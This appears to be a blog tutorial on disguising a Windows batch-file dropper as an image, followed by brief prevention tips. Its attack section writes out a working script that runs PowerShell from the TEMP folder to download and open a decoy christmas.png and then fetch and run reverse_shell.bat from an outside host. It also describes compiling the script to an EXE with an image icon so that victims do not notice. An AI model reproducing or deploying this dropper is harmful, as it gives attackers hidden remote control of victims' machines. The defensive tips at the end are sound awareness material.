# An Image Can Hack Your Device!

Usually when we think about malware, we surely speak about the usual file types that are typically associated with viruses or other malicious code lurking behind the scenes, like `.zip` and `.exe`.

What if I tell you that it is possible that even a simple image file, `.png`, `.gif`, `.jpg`, `.bmp` or whatever, can also equally compromise your entire system? Would you believe me?

Regardless of whether or not you trust the fact, here is a simple process on how to do it (and how to prevent it discussed later on).

## Disclaimer

The process shown below is for educational and private usage only. By reading this article any further, you agree to the term that any damages or criminal charges will be entirely your own responsibility. With that in mind, it is advised that you seek permission from or explicitly inform the person on whom you are going to try this trick.

This article only shows a basic technique that hackers may use to target victims. In the real world, things can be much more complicated (obviously).

## Attacking-Side

#### Windows OS

There is a Powershell command script that can download files from the internet without administrator privileges.

```bash
Invoke-WebRequest 'FILE_URL' -OutFile FILE_NAME.EXTENSION
```
We can also shove this command into a `.bat` (batch) file for easy execution on the victim's device. In order to do it, we can convert the script into `cmd` format.

Here is a sample `.bat` file that can download an image, launch it, and then download a malicious file and run it in the background. The files are downloaded in the `TEMP` directory, so it remains hidden from users by default.

```cmd
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://hack5.de/assets/christmas.png' -OutFile christmas.png"
christmas.png
Powershell -Command "Invoke-WebRequest 'https://hack5.de/malware/reverse_shell.bat' -OutFile revsh.bat"
revsh.bat
```
But obviously hackers would not simply give you the batch file directly. Anyone can just open the file and read its lines of code. So, hackers would use a tool like a `BAT to EXE converter` to compile the batch file into an executable. And then they would disguise the `.exe` file's icon with the image.

So when you actually try to open the `christmas.png` file, you'd actually be running `image.exe` which would indirectly download the main image in the background and then open it up. From the victim's perspective, everything would seem fine - the image would open up as usual BUT there would also be a malicious script running in the background. It could be any sort of malware, from the least harmful (adware) to the most (ransomware). In our example, it would download and run a reverse shell program that allows a hacker to have full control over your device!

Sneaky and scary, right?

## Defensive-Side

Knowledge about hacking allows anyone to be aware of the dangers associated with a particular type of method that a malicious hacker would use. As a regular user, you should also know how to prevent this type of attack from happening in the first place.

My high school IT teacher would always state the following when discussing about cybersecurity :
> Prevention is better than cure

Even if you have a good antivirus, it may not always be able to detect or protect your device from harm. The greatest and also the weakest barrier between the evil hackers and your safety is YOU!


1. Never download files from unknown links or sources, especially email attachments from strangers.
2. Even after downloading a file, check its extension. Use an online tool like [VirusTotal](https://virustotal.com) to automatically and freely scan your file for you - with more than 20 various antivirus brands.
3. Monitor your activities from the Task Manager from time to time, although clever hackers and malware developers know how to hide their processes in the background.

Hackers' most prominent tactic of invading your system is by exploiting human emotions. Via "social engineering", they may pretend to be your friend or someone authentic and try to convince you to download  something or click on a link they send.

The endnote is this :
> If it's digital, it is hackable

Stay safe and good luck!
